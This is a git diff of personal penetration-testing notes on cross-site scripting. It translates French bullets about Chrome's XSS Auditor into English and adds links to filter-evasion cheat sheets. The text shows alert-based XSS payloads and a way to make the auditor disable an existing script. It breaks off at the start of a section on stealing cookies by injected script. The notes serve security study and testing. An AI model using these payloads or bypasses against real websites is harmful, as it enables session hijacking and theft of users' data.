@@ -49,18 +49,18 @@ XSS payloads made from a mixture of encoding/repetition/comments/etc that make i
   * Url of action form : `javascript:alert(1337)`
   * Url : `data:text/html,<script>alert(0)</script>`
 * `google.com/jsapi?callback=alert` can be used to received a function in a callback
-* Check : 
+* Check : [Bypassing Sanitizers](https://zcugni.gitbook.io/notes/pen-test/vulnerabilities#bypassing-sanitizers) & the [Owasp Cheat Sheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)
 
 ## XSS Auditor
 
-* Il existe sur Chrome, pas sur firefox et je sais pas pour les autres
-* Il risque de bientôt disparaître car il amène des vulnérabilités et permet aux devs de moins faire attention/moins corriger leurs failles XSS
-* L’auditeur permet de remarquer des injections XSS. Pour cela, il compare ce qui est passé dans l’url aux scripts de la page \(très gros résumé\).
-* Du coup, si on injecte le même script qu’un existant déjà dans la page, l’auditeur va le disable, pensant qu’il vient de nous, ce qui peut nous permettre d’ensuite faire d’autre choses
+* Exist in Chrome, not in Firefox and I don't know for the rest
+* Broadly speaking, it detects XSS injection by comparing what is given in the url with the scripts of the page
+  * Because of that, we can inject a script that a normal part of the page in the url to actually disable it
+* Might soon disapear because it create vulnerabitilies and gives a false impression of security to devs
 
 ## Get a cookie with that
 
-By example by injection this script :
+By example by injecting this script :
 
 ```javascript
 <script>
